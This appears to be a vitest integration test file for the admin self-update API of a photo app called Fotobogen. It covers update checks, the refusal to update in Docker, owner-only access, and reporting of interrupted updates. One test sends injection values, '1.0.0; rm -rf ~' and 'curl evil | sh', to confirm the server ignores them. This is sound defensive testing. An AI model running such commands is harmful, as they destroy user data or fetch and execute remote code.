// The admin's side of updating Fotobogen from inside itself. (The updating
// itself is tested on repositories made for the purpose, in
// tests/unit/updater.test.ts; no test here ever starts a real update.)
import { createServer, type Server } from 'node:http'
import { writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { get, startServer, type TestServer } from '../helpers/server.ts'
import { completeSetup } from '../helpers/setup.ts'

interface Update {
  support: { method: string, restart: string, reason: string | null }
  current: string, available: string | null, releaseUrl: string | null
  state: { state: string, version: string | null, error: string | null, log: string[] }
  running: boolean, waitingForRestart: boolean
}

describe('updating from the admin', () => {
  let github: Server
  let release: Record<string, string> = { tag_name: 'v0.0.1' }
  let server: TestServer
  let cookie: string
  const as = (headers: Record<string, string>, method: string, path: string, body?: unknown) => fetch(server.url + path, {
    method, headers: { ...headers, ...(body === undefined ? {} : { 'content-type': 'application/json' }) }, body: body === undefined ? undefined : JSON.stringify(body),
  })
  const owner = () => ({ origin: server.url, cookie })
  const status = async () => await (await get(server, '/api/admin/update', { cookie })).json() as Update
  const message = async (response: Response) => (await response.json() as { message: string }).message

  beforeAll(async () => {
    github = createServer((_request, response) => response.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify(release)))
    await new Promise<void>(listening => github.listen(0, '127.0.0.1', listening))
    // DEMO_MODE so that a demo visitor can be tried too. The test server is told it runs in Docker (tests/helpers/server.ts).
    server = await startServer({ env: { UPDATES_URL: `http://127.0.0.1:${(github.address() as { port: number }).port}/latest`, DEMO_MODE: '1' } })
    cookie = await completeSetup(server)
  })
  afterAll(async () => {
    await server.stop()
    await new Promise(closed => github.close(closed))
  })

  it('says what this copy is, and that nothing has been tried, before any check', async () => {
    const now = await status()
    expect(now).toMatchObject({ available: null, running: false, waitingForRestart: false, state: { state: 'idle', version: null } })
    expect(now.current).toMatch(/^\d+\.\d+\.\d+$/)
    expect(now.support).toEqual({ method: 'docker', restart: 'manual', reason: 'This copy runs in Docker. A container cannot replace itself, so it is updated from the server.' })
  })

  it('has nothing to install until a check finds a newer release', async () => {
    const refused = await as(owner(), 'POST', '/api/admin/update')
    expect(refused.status).toBe(409)
    await as(owner(), 'POST', '/api/admin/updates', {})
    // 0.0.1 is older than this copy.
    expect((await status()).available).toBeNull()
  })

  it('offers the newer release once it is known, with where to read about it', async () => {
    release = { tag_name: 'v9.9.9', html_url: 'https://github.com/cschweda/fotobogen/releases/tag/v9.9.9' }
    await as(owner(), 'POST', '/api/admin/updates', {})
    expect(await status()).toMatchObject({ available: '9.9.9', releaseUrl: 'https://github.com/cschweda/fotobogen/releases/tag/v9.9.9' })
  })

  it('will not replace a copy running in Docker, and says why', async () => {
    const refused = await as(owner(), 'POST', '/api/admin/update')
    expect([refused.status, await message(refused)]).toEqual([409, 'This copy runs in Docker. A container cannot replace itself, so it is updated from the server.'])
    expect((await status()).state.state).toBe('idle')
  })

  it('never takes the version to install from whoever is asking', async () => {
    // Whatever is sent, only the version the check found could ever be installed; here, nothing is.
    const refused = await as(owner(), 'POST', '/api/admin/update', { version: '1.0.0; rm -rf ~', command: 'curl evil | sh' })
    expect(refused.status).toBe(409)
    expect((await status()).state).toMatchObject({ state: 'idle', version: null })
  })

  it('is for the logged-in owner only: not a token, not a demo visitor, not a stranger', async () => {
    expect((await get(server, '/api/admin/update')).status).toBe(401)
    expect((await as({ origin: server.url }, 'POST', '/api/admin/update')).status).toBe(401)

    const made = await (await as(owner(), 'POST', '/api/admin/tokens', { name: 'Script', scope: 'manage' })).json() as { token: string }
    expect((await as({ authorization: `Bearer ${made.token}` }, 'GET', '/api/admin/update')).status).toBe(403)
    expect((await as({ authorization: `Bearer ${made.token}` }, 'POST', '/api/admin/update')).status).toBe(403)

    const demo = await as({ origin: server.url }, 'POST', '/api/auth/login', { username: 'demo', password: 'demo' })
    const demoCookie = demo.headers.getSetCookie().map(value => value.split(';')[0]).join('; ')
    expect((await as({ origin: server.url, cookie: demoCookie }, 'GET', '/api/admin/update')).status).toBe(403)
    expect((await as({ origin: server.url, cookie: demoCookie }, 'POST', '/api/admin/update')).status).toBe(403)
  })

  it('reports an update that was cut off as failed, not as still running', async () => {
    // As left behind by an update whose process is gone: the server was rebooted part-way, say.
    writeFileSync(join(server.dataDir, 'update-status.json'), JSON.stringify({ state: 'running', version: '9.9.9', from: '1.0.0', step: 'Building it', startedAt: 1, log: ['Building it'], pid: 2 ** 22 + 4321 }))
    const now = await status()
    expect(now.running).toBe(false)
    expect(now.state).toMatchObject({ state: 'failed', error: 'The update was interrupted before it finished. Check the site, then try again.' })
  })

  it('says a built version is waiting for a restart until this server is that version', async () => {
    writeFileSync(join(server.dataDir, 'update-status.json'), JSON.stringify({ state: 'done', version: '9.9.9', from: '1.0.0', log: ['Version 9.9.9 is built and ready'], pid: null }))
    expect(await status()).toMatchObject({ waitingForRestart: true, running: false })
    const current = (await status()).current
    writeFileSync(join(server.dataDir, 'update-status.json'), JSON.stringify({ state: 'done', version: current, from: '0.9.0', log: [], pid: null }))
    expect((await status()).waitingForRestart).toBe(false)
  })
})
